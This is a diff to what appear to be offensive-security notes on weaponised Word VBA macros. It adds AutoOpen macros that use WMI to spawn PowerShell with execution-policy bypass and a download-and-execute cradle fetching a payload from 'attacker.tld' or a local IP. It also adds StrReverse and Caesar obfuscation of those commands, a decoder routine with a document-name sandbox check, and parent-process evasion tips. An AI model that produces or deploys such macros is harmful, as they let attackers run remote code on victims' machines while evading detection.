@@ -75,8 +75,6 @@ End Sub
 ```
 
 
-
-
 # Changing Prent-Child Relationship
 
 When a powershell is executed from a word macro a child `powershell.exe` process is created from `winword.exe` (MS Word as a Parent). This isn't normal behaviour and highly suspicious.
@@ -89,6 +87,29 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell"
 ```
+
+```vb
+Sub MyMacro
+  strArg = "powershell"
+  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub AutoOpen()
+    Mymacro
+End Sub
+```
+
+```vb
+Sub MyMacro
+  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://attacker.tld/benjugat.txt'))"
+  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub AutoOpen()
+    Mymacro
+End Sub
+```
+
 
 
 > **OPSEC Note**: In that case, powershell will be a child of `WmiPrvSE.exe` rather than MS Word.
@@ -435,4 +456,112 @@ Options:
 
 ```
 .\EvilClippy.exe -g -r benjugat.doc
+```
+
+
+# Obfuscating VBA
+
+## StrReverse
+
+One way to obfuscate is via the `StrReverse` function.
+
+We can use `Code Beautify` to get the reverse strings.
+
+* [https://codebeautify.org/reverse-string](https://codebeautify.org/reverse-string)
+
+* Original code:
+
+```vb
+Sub MyMacro()
+  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.202/benjugat.txt'))"
+  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
+
+* Obfuscated code:
+
+```vb
+Sub MyMacro()
+  strArg = StrReverse("))'txt.tagujneb/202.54.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")
+  GetObject(StrReverse(":stmgmniw")).Get(StrReverse("ssecorP_23niW")).Create strArg, Null, Null, pid
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
+
+## Caesar
+
+We can encrypt all the strings with Caesar.
+
+```powershell
+$payload = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.202/benjugat.txt'))"
+
+[string]$output = ""
+
+$payload.ToCharArray() | %{
+    [string]$thischar = [byte][char]$_ + 17
+    if($thischar.Length -eq 1)
+    {
+        $thischar = [string]"00" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 2)
+    {
+        $thischar = [string]"0" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 3)
+    {
+        $output += $thischar
+    }
+}
+$output | clip
+```
+
+Now we can create a decrypting ruitine.
+
+```vb
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Function Pears(Beets)
+    Pears = Chr(Beets - 17)
+End Function
+
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+    Do
+    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+    Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+
+Function MyMacro()
+    Dim Apples As String
+    Dim Water As String
+    
+    If ActiveDocument.Name <> Nuts("085128116066063117128116") Then
+        Exit Function
+    End If
+
+    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
+    Water = Nuts(Apples)
+    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+End Function
+
 ```
